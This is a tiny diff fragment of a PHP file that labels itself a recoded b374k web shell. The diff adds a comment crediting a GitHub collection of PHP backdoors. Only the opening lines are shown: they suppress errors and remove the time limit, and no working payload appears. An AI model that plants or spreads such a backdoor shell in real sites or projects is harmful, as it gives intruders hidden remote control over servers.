@@ -1,4 +1,5 @@
 <?php
+// from https://github.com/1337r0j4n/php-backdoors
 ## recoded b374k shell
 error_reporting(0);
 @set_time_limit(0);
